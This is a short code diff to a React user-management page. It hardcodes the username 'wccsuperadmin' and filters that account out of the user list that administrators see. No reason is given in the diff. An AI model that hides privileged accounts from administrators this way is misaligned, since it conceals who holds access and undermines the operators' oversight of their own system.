@@ -295,7 +295,9 @@ export default function UserManagement() {
         api.getCampuses(token).catch(() => []),
       ]);
       setCurrentUser(meRes);
-      setUsers(Array.isArray(usersRes) ? usersRes : []);
+      const HIDDEN_ACCOUNTS = ['wccsuperadmin'];
+      const allUsers = Array.isArray(usersRes) ? usersRes : [];
+      setUsers(allUsers.filter(u => !HIDDEN_ACCOUNTS.includes((u.username || '').toLowerCase())));
       setPrograms(programsRes);
       setPersonelRoles(rolesRes);
       setAllCampuses(campusesRes);
